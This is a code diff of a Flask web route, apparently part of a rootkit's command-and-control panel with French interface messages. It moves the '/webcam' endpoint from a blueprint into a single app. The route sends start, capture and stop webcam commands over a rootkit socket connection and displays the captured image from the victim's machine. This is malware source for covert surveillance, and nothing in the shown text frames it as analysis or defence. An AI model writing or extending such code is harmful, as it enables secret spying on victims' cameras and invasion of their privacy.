@@ -1,13 +1,9 @@
-from flask import Blueprint, render_template, request, redirect, url_for
-import utils.state as state
-import os
+# ---------------------------------- WEBCAM ---------------------------------- #
 
-webcam_bp = Blueprint('webcam', __name__)
-
-@webcam_bp.route('/', methods=['GET', 'POST'])
+@app.route('/webcam', methods=['GET', 'POST'])
 def webcam():
-    if not state.authenticated:
-        return redirect(url_for('auth.login'))
+    if not authenticated:
+        return redirect(url_for('login'))
 
     webcam_output = ""
     image_path = "/var/www/html/images/capture.jpg"
@@ -16,22 +12,23 @@ def webcam():
         action = request.form.get('action')
 
         try:
-            with state.connection_lock:
-                if state.rootkit_connection:
+            with connection_lock:
+                if rootkit_connection:
                     if action == 'start':
-                        state.rootkit_connection.sendall(b"start_webcam\n")
+                        rootkit_connection.sendall(b"start_webcam\n")
                         webcam_output = "✅ Webcam démarrée."
                     elif action == 'capture':
-                        state.rootkit_connection.sendall(b"capture_image\n")
+                        rootkit_connection.sendall(b"capture_image\n")
                         webcam_output = "📸 Image capturée avec succès."
                     elif action == 'stop':
-                        state.rootkit_connection.sendall(b"stop_webcam\n")
+                        rootkit_connection.sendall(b"stop_webcam\n")
                         webcam_output = "🛑 Webcam arrêtée."
                     else:
                         webcam_output = "❌ Action inconnue."
         except Exception as e:
             webcam_output = f"💥 Erreur : {e}"
 
+    # Vérification si l'image existe
     image_exists = os.path.exists(image_path)
 
     return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
